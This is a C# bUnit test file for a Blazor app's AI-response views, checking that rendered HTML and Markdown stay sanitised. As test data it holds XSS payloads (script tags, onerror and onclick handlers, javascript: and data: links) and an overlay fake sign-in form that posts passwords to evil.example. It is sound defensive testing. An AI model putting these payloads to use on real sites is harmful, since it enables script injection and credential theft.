using AngleSharp.Dom;
using Bunit;
using IniaAi.Domain.Entities.Workflows;
using IniaAi.Domain.Entities.Workflows.Blocks;
using IniaAi.Domain.Entities.Workflows.Enums;
using IniaAi.Domain.Entities.Workflows.Responses;
using IniaAi.WebApp.Components.WorkflowEditor.Components.Blocks.Responses;
using Microsoft.Extensions.DependencyInjection;
using MudBlazor;
using Block = IniaAi.Domain.Entities.Workflows.Blocks.Block;
using MudBlazor.Extensions;
using MudBlazor.Services;
using TextField = MudBlazor.MudTextField<string>;

namespace IniaAi.WebApp.Tests.Components.WorkflowEditor;

public class ResponseInteractionScriptTests : BunitContext
{
    private const string SCRIPTED_IMAGE = """<img src="x" onerror="alert(1)">""";
    private const string SCRIPT = "<script>alert(2)</script>";
    private const string JAVASCRIPT_LINK = """<a href="javascript:alert(3)">open</a>""";
    private const string FAKE_SIGN_IN = """<form action="https://evil.example/collect" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999"><input name="password" type="password"><select><option>a</option></select><textarea></textarea><button>Sign in</button></form>""";

    public ResponseInteractionScriptTests()
    {
        JSInterop.Mode = JSRuntimeMode.Loose;
        _ = Services.AddMudServices();
        _ = Services.AddMudMarkdownServices();
    }

    [Fact]
    public void TheHtmlView_KeepsTheFormattingAndRunsNothingFromTheOutput()
    {
        string html = $"<table><tr><td>Revenue</td><td>2025</td></tr></table>{SCRIPTED_IMAGE}{SCRIPT}{JAVASCRIPT_LINK}";
        BlockResponse response = ResponseOf(html: html, markdown: null);

        IRenderedComponent<HtmlResponseInteraction> view = Render<HtmlResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal("2025", view.FindAll("td")[1].TextContent);
        AssertRunsNothing(view);
        Assert.Equal(html, response.HtmlResponse);
    }

    [Fact]
    public void TheHtmlView_DrawsNoFormThatCouldCollectWhatTheReaderTypes()
    {
        BlockResponse response = ResponseOf(html: $"<h3>Revenue</h3><div style=\"position:fixed;z-index:9999;color:red\">over</div>{FAKE_SIGN_IN}", markdown: null);

        IRenderedComponent<HtmlResponseInteraction> view = Render<HtmlResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal("Revenue", view.Find("h3").TextContent);
        Assert.Empty(view.FindAll("form, select, textarea, input[type=password], [action]"));
        Assert.DoesNotContain(view.FindAll("button"), button => button.TextContent.Contains("Sign in", StringComparison.Ordinal));
        Assert.DoesNotContain(view.FindAll("[style]"), element => element.GetAttribute("style")!.Contains("position", StringComparison.OrdinalIgnoreCase)
            || element.GetAttribute("style")!.Contains("z-index", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void TheHtmlView_KeepsAMailLink()
    {
        BlockResponse response = ResponseOf(html: """<a href="mailto:analyst@example.com">write</a>""", markdown: null);

        IRenderedComponent<HtmlResponseInteraction> view = Render<HtmlResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal("mailto:analyst@example.com", view.Find("a").GetAttribute("href"));
    }

    [Fact]
    public void TheHtmlView_ShowsTheStoredTextUnchangedForEditing()
    {
        string html = $"<p>Revenue</p>{SCRIPTED_IMAGE}";
        BlockResponse response = ResponseOf(html: html, markdown: null);
        IRenderedComponent<HtmlResponseInteraction> view = Render<HtmlResponseInteraction>(p => p.Add(c => c.Response, response));

        view.Find("input[type=checkbox]").Change(false);

        Assert.Equal(html, view.FindComponent<TextField>().Instance.GetState(field => field.Value));
    }

    [Fact]
    public void TheHtmlView_ShowsAnEditedResponseSanitised()
    {
        BlockResponse response = ResponseOf(html: "<h3>first</h3>", markdown: null);
        IRenderedComponent<HtmlResponseInteraction> view = Render<HtmlResponseInteraction>(p => p.Add(c => c.Response, response));

        response.HtmlResponse = $"<h3>second</h3>{SCRIPTED_IMAGE}";
        view.Render();

        Assert.Equal("second", view.Find("h3").TextContent);
        AssertRunsNothing(view);
    }

    [Fact]
    public void TheMarkdownView_KeepsTheFormattingAndShowsRawHtmlAsText()
    {
        string markdown = $"| Year | Revenue |\n| --- | --- |\n| 2025 | 10 |\n\n{SCRIPTED_IMAGE}\n\nText {SCRIPT} after";
        BlockResponse response = ResponseOf(html: null, markdown: markdown);

        IRenderedComponent<MarkdownResponseInteraction> view = Render<MarkdownResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal("2025", view.FindAll("td")[0].TextContent.Trim());
        Assert.Contains(SCRIPTED_IMAGE, view.Find(".mud-markdown-body").TextContent);
        AssertRunsNothing(view);
        Assert.Equal(markdown, response.MarkdownResponse);
    }

    [Fact]
    public void TheMarkdownView_HandsMathToMathJax()
    {
        BlockResponse response = ResponseOf(html: null, markdown: "Margin $$\\frac{a}{b}$$");

        Render<MarkdownResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Contains(JSInterop.Invocations, invocation => invocation.Identifier == "appendMathJaxScript");
    }

    [Fact]
    public void TheMarkdownView_AddsNoAttributeWrittenInTheMarkdown()
    {
        BlockResponse response = ResponseOf(html: null, markdown: "### Revenue {onclick=\"alert(6)\"}\n\n[open](https://example.com){onmouseover=\"alert(7)\"}");

        IRenderedComponent<MarkdownResponseInteraction> view = Render<MarkdownResponseInteraction>(p => p.Add(c => c.Response, response));

        AssertRunsNothing(view);
    }

    [Theory]
    [InlineData("javascript:alert(3)")]
    [InlineData("JavaScript:alert(3)")]
    [InlineData("vbscript:msgbox(3)")]
    [InlineData("java\tscript:alert(3)")]
    [InlineData("data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==")]
    public void TheMarkdownView_DropsALinkThatCouldRunScript(string url)
    {
        BlockResponse response = ResponseOf(html: null, markdown: $"[open](<{url}>)");

        IRenderedComponent<MarkdownResponseInteraction> view = Render<MarkdownResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal("#", view.Find("a").GetAttribute("href"));
    }

    [Theory]
    [InlineData("https://example.com/report")]
    [InlineData("http://example.com/report")]
    [InlineData("mailto:analyst@example.com")]
    [InlineData("/reports/42")]
    [InlineData("#summary")]
    public void TheMarkdownView_KeepsAnOrdinaryLink(string url)
    {
        BlockResponse response = ResponseOf(html: null, markdown: $"[open]({url})");

        IRenderedComponent<MarkdownResponseInteraction> view = Render<MarkdownResponseInteraction>(p => p.Add(c => c.Response, response));

        Assert.Equal(url, view.Find("a").GetAttribute("href"));
    }

    private static void AssertRunsNothing<TComponent>(IRenderedComponent<TComponent> view)
        where TComponent : Microsoft.AspNetCore.Components.IComponent
    {
        Assert.Empty(view.FindAll("script"));
        Assert.Empty(view.FindAll("img[onerror]"));
        Assert.DoesNotContain(view.FindAll("a[href]"), link => link.GetAttribute("href")!.Contains("script:", StringComparison.OrdinalIgnoreCase));
        Assert.All(view.FindAll("*"), element => Assert.DoesNotContain(element.Attributes, attribute => attribute.Name.StartsWith("on", StringComparison.OrdinalIgnoreCase)));
    }

    private static BlockResponse ResponseOf(string? html, string? markdown)
    {
        var workflow = new Workflow("Run");
        Block block = new(BlockTypes.AiQuery, new Section("Body", workflow), "ai") { Name = "AI" };
        return new BlockResponse(block) { HtmlResponse = html, MarkdownResponse = markdown };
    }
}
